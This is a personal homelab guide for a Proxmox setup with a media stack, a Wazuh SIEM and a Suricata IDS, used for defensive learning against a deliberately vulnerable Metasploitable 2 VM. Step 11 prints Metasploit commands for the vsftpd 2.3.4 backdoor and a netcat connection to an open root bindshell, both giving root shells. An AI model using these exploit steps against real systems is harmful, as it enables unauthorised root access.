# BuzzLab — Full Setup & Configuration Guide

> Everything we built, step by step.  
> Ilke Augusto Cabral · March 2026

---

## Table of Contents

- [Part 1 — Proxmox & Media Stack](#part-1)
- [Part 2 — Wazuh SIEM](#part-2)
- [Part 3 — Metasploitable 2 Attack Target](#part-3)
- [Part 4 — Remote Access with Tailscale](#part-4)
- [Part 5 — Network Map](#part-5)
- [Part 6 — Next Steps](#part-6)

---

## Part 1 — Proxmox & Media Stack

---

### Step 01 — Proxmox VE Installation

Proxmox VE is an open-source virtualisation platform installed directly on the bare-metal machine. It acts as the hypervisor that manages all containers and VMs in BuzzLab.

#### Hardware

| Component | Specification |
|-----------|--------------|
| CPU | Intel Core i7 |
| RAM | 16 GB |
| Boot Drive | NVMe SSD — 238.5 GB (Proxmox OS) |
| Data Drive | SATA HDD — 465.8 GB (media & appdata) |
| Network | TP-Link TL-WR841N · 192.168.0.0/24 |

#### Key Paths on Proxmox Host

```
/mnt/media              → HDD mount point
/mnt/media/appdata      → All service configs
/mnt/media/media        → Movies & TV shows
/mnt/media/downloads    → Download client output
```

> Note: The HDD is mounted at /mnt/media on the Proxmox host and passed into LXCs via bind mount. All containers share the same storage without copying files.

---

### Step 02 — LXC Container: mediaserver (ID: 100)

An LXC (Linux Container) is a lightweight virtualisation method — faster and more resource-efficient than a full VM. The mediaserver LXC hosts the entire Docker stack.

#### Container Settings

```
OS:         Ubuntu 24.04 LTS
CPU:        4 cores
RAM:        4096 MB
Disk:       32 GB (local-lvm)
IP:         192.168.0.101/24
Gateway:    192.168.0.1
Features:   nesting=1, tun=1
Bind Mount: /mnt/media → /mnt/media
```

> Note: nesting=1 is required for Docker to run inside an LXC. tun=1 is required for Tailscale.

---

### Step 03 — Docker Stack

All media services run via Docker Compose inside the mediaserver LXC. Compose file location:

```
/mnt/media/appdata/docker-compose.yml
```

#### Services

| Service | Port | Role |
|---------|------|------|
| Jellyfin | 8096 | Media server — Movies & TV |
| Sonarr | 8989 | Automates TV show downloads |
| Radarr | 7878 | Automates movie downloads |
| Prowlarr | 9696 | Manages indexers for Sonarr & Radarr |
| qBittorrent | 8080 | Download client |
| Bazarr | 6767 | Automatic subtitle management |

---

### Step 04 — Storage & Library Cleanup

Jellyfin requires specific folder naming to match content against TMDB/TVDB. Several fixes were applied from the Proxmox host.

#### Fixes Applied

**Merge duplicate folders**
```bash
mv "/mnt/media/media/tv/cross" "/mnt/media/media/tv/Cross (2024)/"
rmdir "/mnt/media/media/tv/relationship goals"
rmdir "/mnt/media/media/tv/the drift"
```

**Move loose episode files into season subfolders**
```bash
mkdir -p "/mnt/media/media/tv/Cross (2024)/Season 02"
mv "/mnt/media/media/tv/Cross (2024)"/Cross.2024.S01* "/mnt/media/media/tv/Cross (2024)/Season 01/"
mv "/mnt/media/media/tv/Cross (2024)"/Cross.2024.S02* "/mnt/media/media/tv/Cross (2024)/Season 02/"
```

**Move movies out of TV library**
```bash
mv "/mnt/media/media/tv/The drift" "/mnt/media/media/movies/"
mv "/mnt/media/media/tv/Relationship Goals" "/mnt/media/media/movies/"
```

**Rename folders to match Jellyfin format**
```bash
mv "/mnt/media/media/tv/paradise" "/mnt/media/media/tv/Paradise (2025)"
mv "/mnt/media/media/tv/Power book 2" "/mnt/media/media/tv/Power Book II Ghost"
mv "/mnt/media/media/tv/young shelock" "/mnt/media/media/tv/Young Sherlock"
mv "/mnt/media/media/tv/the last thing he told me" "/mnt/media/media/tv/The Last Thing He Told Me"
```

> Note: Always do file operations from the Proxmox host (/mnt/media), not inside the LXC — bind mount ownership restrictions prevent LXC root from changing file ownership.

---

## Part 2 — Wazuh SIEM

Wazuh is an open-source SIEM platform. It collects logs and events from monitored machines via agents, analyses them for threats, and presents everything on a web dashboard.

---

### Step 05 — Wazuh LXC Container (ID: 101)

Wazuh runs in its own dedicated LXC, isolated from the media stack. Even if mediaserver is compromised, the monitoring platform stays intact.

#### Container Settings

```
Hostname:   wazuh
ID:         101
OS:         Ubuntu 22.04 LTS
CPU:        4 cores
RAM:        6144 MB
Disk:       50 GB (local-lvm)
IP:         192.168.0.102/24
Gateway:    192.168.0.1
```

#### Installation

```bash
curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh
curl -sO https://packages.wazuh.com/4.7/config.yml

# Edit config.yml — set all node IPs to 192.168.0.102
nano config.yml

# Run all-in-one installer
bash wazuh-install.sh -a
```

Components installed:
- **Wazuh Manager** — receives and analyses agent events
- **Wazuh Indexer** — stores events and alerts (OpenSearch)
- **Wazuh Dashboard** — web UI at https://192.168.0.102

> Note: Save the admin credentials printed at the end of the install — they cannot be recovered without resetting.

---

### Step 06 — Wazuh Agent on mediaserver

#### Version Mismatch Fix

Agent version must be equal to or lower than the manager. Initially installed v4.14.3 (newer than manager v4.7.x) — caused rejection error:

```
ERROR: Agent version must be lower or equal to manager version (from manager)
```

Fix: uninstall and reinstall matching version.

#### Installation

```bash
# Install GPG
apt install gpg -y

# Add repo key
curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --dearmor -o /usr/share/keyrings/wazuh.gpg

# Add repository
echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" | tee /etc/apt/sources.list.d/wazuh.list

# Install matching version
apt update && apt install wazuh-agent=4.7.0-1 -y

# Set manager IP in config
nano /var/ossec/etc/ossec.conf
# Set: <address>192.168.0.102</address>

# Enable and start
systemctl enable wazuh-agent && systemctl start wazuh-agent
```

#### Verify Connection

```bash
grep -i "connected\|error\|key" /var/ossec/logs/ossec.log | tail -20
```

---

## Part 3 — Metasploitable 2 Attack Target

Metasploitable 2 is a deliberately vulnerable Linux VM used as an attack target for penetration testing practice.

---

### Step 07 — Import Metasploitable 2 VM (ID: 102)

#### Transfer to Proxmox (from Windows laptop)

```powershell
cd C:\Users\Hp\Downloads\metasploitable-linux-2.0.0\Metasploitable2-Linux
scp Metasploitable.vmdk root@192.168.0.200:/tmp/
```

#### Import and Configure

```bash
# Create empty VM
qm create 102 --name target --memory 1024 --cores 2 --net0 virtio,bridge=vmbr0 --ostype l26

# Import disk
qm importdisk 102 /tmp/Metasploitable.vmdk local-lvm

# Attach disk and set boot
qm set 102 --ide0 local-lvm:vm-102-disk-0
qm set 102 --boot c --bootdisk ide0

# Start VM
qm start 102
```

#### VM Details

```
ID:           102
Name:         target
OS:           Ubuntu 8.04 (32-bit) — Linux kernel 2.6.24
IP:           192.168.0.103
Credentials:  msfadmin / msfadmin
```

#### SSH Access

```bash
ssh -oHostKeyAlgorithms=+ssh-rsa,ssh-dss msfadmin@192.168.0.103
```

#### Open Ports & Vulnerable Services

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 21 | FTP | vsftpd 2.3.4 | Backdoor vulnerability |
| 22 | SSH | OpenSSH 4.7p1 | Old, weak ciphers |
| 23 | Telnet | Linux telnetd | Cleartext credentials |
| 80 | HTTP | Apache 2.2.8 | Web app vulnerabilities |
| 139/445 | SMB | Samba 3.x | Multiple exploits |
| 1524 | Bindshell | — | Open root shell |
| 3306 | MySQL | 5.0.51a | No root password |
| 5432 | PostgreSQL | 8.3.0 | Default credentials |
| 5900 | VNC | 3.3 | No authentication |
| 8180 | HTTP | Apache Tomcat | Default credentials |

> Note: Wazuh agent cannot be installed on Metasploitable 2 — Linux kernel 2.6.24 (2008, 32-bit) is incompatible with modern Wazuh agents.

---

## Part 4 — Remote Access with Tailscale

Tailscale is a VPN that connects devices securely over the internet without port forwarding.

---

### Step 08 — Install Tailscale

#### Enable TUN device in LXC config (from Proxmox host)

```bash
# For mediaserver
echo "lxc.cgroup2.devices.allow: c 10:200 rwm" >> /etc/pve/lxc/100.conf
echo "lxc.mount.entry: /dev/net/tun dev/net/tun none bind,create=file" >> /etc/pve/lxc/100.conf
pct reboot 100

# For Wazuh LXC
echo "lxc.cgroup2.devices.allow: c 10:200 rwm" >> /etc/pve/lxc/101.conf
echo "lxc.mount.entry: /dev/net/tun dev/net/tun none bind,create=file" >> /etc/pve/lxc/101.conf
pct reboot 101
```

#### Install on each machine

```bash
curl -fsSL https://tailscale.com/install.sh | sh
systemctl start tailscaled
tailscale up   # opens auth URL — log in with Tailscale account
```

#### DNS fix for Wazuh LXC (no internet issue)

```bash
echo "nameserver 8.8.8.8" >> /etc/resolv.conf
```

#### Remote Access URLs

| Service | Local IP | Tailscale Access |
|---------|----------|-----------------|
| Proxmox Web UI | 192.168.0.200:8006 | https://<proxmox-ts-ip>:8006 |
| Jellyfin | 192.168.0.101:8096 | http://<mediaserver-ts-ip>:8096 |
| Wazuh Dashboard | 192.168.0.102 | https://<wazuh-ts-ip> |

---

## Part 5 — Network Map

| Host | IP | Type | Role |
|------|----|------|------|
| Proxmox Host | 192.168.0.200 | Bare Metal | Hypervisor |
| mediaserver (ID: 100) | 192.168.0.101 | LXC | Docker media stack + Wazuh agent |
| wazuh (ID: 101) | 192.168.0.102 | LXC | SIEM — security monitoring |
| target (ID: 102) | 192.168.0.103 | VM | Metasploitable 2 — attack target |
| Router | 192.168.0.1 | Hardware | Gateway |

---

## Part 6 — Next Steps

- [ ] First attack — vsftpd 2.3.4 backdoor on port 21 using Metasploit
- [ ] Watch Wazuh alerts trigger in real time during attacks
- [ ] Install Wazuh agent on Proxmox host itself
- [ ] Set up Metasploitable 3 Windows VM (requires Vagrant + VirtualBox on laptop)
- [ ] Configure Wazuh active response rules
- [ ] Document attack findings for portfolio / CV

---

*BuzzLab · github.com/ilkecabral · March 2026*

---

## Part 7 — Suricata IDS & Attack Lab

---

### Step 09 — Suricata Network IDS on Proxmox Host

Suricata is a Network Intrusion Detection System (IDS) that monitors all traffic passing through the Proxmox bridge (`vmbr0`). Since every packet between Kali, mediaserver, Wazuh, and Metasploitable goes through this bridge, Suricata sees everything.

#### Why Suricata instead of a Wazuh agent on Metasploitable?

Metasploitable 2 runs Linux kernel 2.6.24 (2008, 32-bit) — too old for a modern Wazuh agent. Suricata running on the Proxmox host monitors the entire network at the bridge level, covering all machines without needing an agent on each one.

#### Installation

```bash
# On Proxmox host
apt install suricata -y
```

#### Configure interface

```bash
nano /etc/suricata/suricata.yaml
```

Set the interface to the Proxmox bridge:
```yaml
af-packet:
  - interface: vmbr0

community-id: true
```

#### Load detection rules

Without rules, Suricata logs traffic but generates no alerts.

```bash
apt install suricata-update -y
suricata-update
systemctl restart suricata
```

This downloads ~49,000 rules from the Emerging Threats ruleset.

#### Verify rules loaded

```bash
grep "rules_loaded" /var/log/suricata/eve.json | tail -1
```

Should show `"rules_loaded":49078` — confirmed working.

---

### Step 10 — Connect Suricata to Wazuh

The Wazuh agent on the Proxmox host reads Suricata's `eve.json` log file and ships alerts to the Wazuh manager. This was configured in `/var/ossec/etc/ossec.conf`:

```xml
<localfile>
  <log_format>json</log_format>
  <location>/var/log/suricata/eve.json</location>
</localfile>
```

#### Wazuh agent on Proxmox host

```bash
# Add Wazuh repo key
curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --dearmor -o /usr/share/keyrings/wazuh.gpg
echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" | tee /etc/apt/sources.list.d/wazuh.list

# Install matching version
apt update && apt install wazuh-agent=4.7.0-1 -y

# Configure manager IP + Suricata log path in ossec.conf
nano /var/ossec/etc/ossec.conf

# Start agent
systemctl enable wazuh-agent && systemctl start wazuh-agent
```

---

### Step 11 — First Attacks & Alert Verification

#### Attack 1 — vsftpd 2.3.4 Backdoor (port 21)

From Kali using Metasploit:
```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.0.103
set payload cmd/unix/interact
run
```

Result: `uid=0(root) gid=0(root)` — root shell obtained.

#### Attack 2 — Open Root Shell (port 1524)

Port 1524 on Metasploitable is a bindshell — no exploit needed, just connect:
```bash
nc 192.168.0.103 1524
```

Result: Instant root shell.

#### SSH access to Metasploitable

Metasploitable uses legacy key types — connect with:
```bash
ssh -oHostKeyAlgorithms=+ssh-rsa,ssh-dss msfadmin@192.168.0.103
```

#### Nmap scan from Kali

```bash
nmap -sV -O 192.168.0.103
```

This triggered Suricata alerts immediately — visible in:
- `tail -f /var/log/suricata/eve.json | grep '"event_type":"alert"'`
- Wazuh dashboard → Security Events

#### Alert pipeline confirmed working

```
Kali attack → vmbr0 bridge → Suricata (49,078 rules) → eve.json → Wazuh agent → Wazuh manager → Dashboard
```

---

## Part 8 — Updated Network Map

| Host | IP | Type | Role |
|------|----|------|------|
| Proxmox Host | 192.168.0.200 | Bare Metal | Hypervisor + Suricata IDS + Wazuh agent |
| mediaserver (ID: 100) | 192.168.0.101 | LXC | Docker media stack + Wazuh agent |
| wazuh (ID: 101) | 192.168.0.102 | LXC | SIEM — manager + indexer + dashboard |
| target (ID: 102) | 192.168.0.103 | VM | Metasploitable 2 — attack target |
| Router | 192.168.0.1 | Hardware | Gateway |
| Kali (laptop) | 192.168.0.x | Physical | Attack machine |

---

## Part 9 — Next Steps

- [ ] Try more exploits — SMB (port 445), MySQL (port 3306), Telnet brute force
- [ ] Study each Suricata alert in Wazuh — understand which rule fired and why
- [ ] Set up Metasploitable 3 Windows VM (requires Vagrant + VirtualBox on laptop)
- [ ] Configure Wazuh active response — auto-block IPs triggering too many alerts
- [ ] Document each attack and detection for portfolio / CV
- [ ] Add DVWA in Docker on mediaserver for web app attack practice

---

*BuzzLab · github.com/ilkecabral · March 2026*
